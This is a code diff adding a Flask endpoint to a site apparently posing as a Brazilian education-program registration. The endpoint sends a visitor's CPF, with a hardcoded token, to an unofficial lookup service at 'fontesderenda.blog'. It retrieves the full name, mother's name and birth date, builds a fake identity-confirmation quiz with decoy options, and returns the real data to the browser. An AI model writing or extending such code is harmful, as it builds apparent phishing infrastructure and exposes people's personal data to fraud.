@@ -231,6 +231,119 @@ def formulario_inscricao():
     """Registration form page - CPF step"""
     return render_template('formulario_inscricao.html', page_title="Formulário de Inscrição - Mais Agentes da Educação")
 
+@app.route('/validar-cpf', methods=['POST'])
+def validar_cpf():
+    """Validate CPF and get user data from API"""
+    import requests
+    import random
+    from datetime import datetime, timedelta
+    
+    data = request.get_json()
+    cpf = data.get('cpf', '').replace('.', '').replace('-', '')
+    
+    if not cpf or len(cpf) != 11:
+        return jsonify({'error': 'CPF inválido'}), 400
+    
+    try:
+        # Consultar API de CPF
+        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf={cpf}"
+        response = requests.get(api_url, timeout=10)
+        
+        if response.status_code != 200:
+            return jsonify({'error': 'Erro ao consultar dados do CPF'}), 400
+        
+        dados_api = response.json()
+        
+        if 'DADOS' not in dados_api:
+            return jsonify({'error': 'CPF não encontrado na base de dados'}), 404
+        
+        dados_usuario = dados_api['DADOS']
+        nome_completo = dados_usuario.get('nome', '')
+        nome_mae = dados_usuario.get('nome_mae', '')
+        data_nascimento = dados_usuario.get('data_nascimento', '')
+        
+        # Gerar primeiro nome para o cabeçalho
+        primeiro_nome = nome_completo.split()[0] if nome_completo else 'Usuário'
+        
+        # Gerar opções falsas para o quiz
+        nomes_falsos = [
+            "CARLOS EDUARDO SILVA",
+            "MARIA FERNANDA SANTOS",
+            "JOÃO PEDRO OLIVEIRA",
+            "ANA CAROLINA SOUZA",
+            "RAFAEL HENRIQUE COSTA",
+            "JULIANA ALVES PEREIRA"
+        ]
+        
+        maes_falsas = [
+            "MARIA SILVA SANTOS",
+            "REGINA OLIVEIRA COSTA",
+            "CARMEN SOUZA PEREIRA",
+            "HELENA FERNANDES LIMA",
+            "BEATRIZ ALMEIDA ROCHA",
+            "LUCIANA TORRES MENDOZA"
+        ]
+        
+        # Gerar datas falsas (variação de ±10 anos)
+        if data_nascimento:
+            try:
+                data_original = datetime.strptime(data_nascimento, '%Y-%m-%d %H:%M:%S')
+                datas_falsas = []
+                for i in range(5):
+                    anos_diff = random.randint(-10, 10)
+                    meses_diff = random.randint(-6, 6)
+                    dias_diff = random.randint(-15, 15)
+                    
+                    nova_data = data_original + timedelta(days=anos_diff*365 + meses_diff*30 + dias_diff)
+                    datas_falsas.append(nova_data.strftime('%Y-%m-%d %H:%M:%S'))
+            except:
+                datas_falsas = [
+                    "1980-03-15 00:00:00",
+                    "1985-07-22 00:00:00",
+                    "1990-11-08 00:00:00",
+                    "1995-02-14 00:00:00",
+                    "1988-09-30 00:00:00"
+                ]
+        else:
+            datas_falsas = [
+                "1980-03-15 00:00:00",
+                "1985-07-22 00:00:00",
+                "1990-11-08 00:00:00"
+            ]
+        
+        # Criar quiz com 3 opções cada
+        quiz_nomes = random.sample(nomes_falsos, 2) + [nome_completo]
+        random.shuffle(quiz_nomes)
+        
+        quiz_maes = random.sample(maes_falsas, 2) + [nome_mae]
+        random.shuffle(quiz_maes)
+        
+        quiz_datas = random.sample(datas_falsas, 2) + [data_nascimento]
+        random.shuffle(quiz_datas)
+        
+        return jsonify({
+            'sucesso': True,
+            'primeiro_nome': primeiro_nome,
+            'dados_originais': {
+                'nome': nome_completo,
+                'nome_mae': nome_mae,
+                'data_nascimento': data_nascimento,
+                'cpf': cpf
+            },
+            'quiz': {
+                'nomes': quiz_nomes,
+                'maes': quiz_maes,
+                'datas': quiz_datas
+            }
+        })
+        
+    except requests.exceptions.RequestException as e:
+        app.logger.error(f"Erro na API de CPF: {e}")
+        return jsonify({'error': 'Erro de conexão com o serviço de validação'}), 500
+    except Exception as e:
+        app.logger.error(f"Erro inesperado: {e}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
 @app.route('/login')
 def login():
     """Login page (mock interface)"""
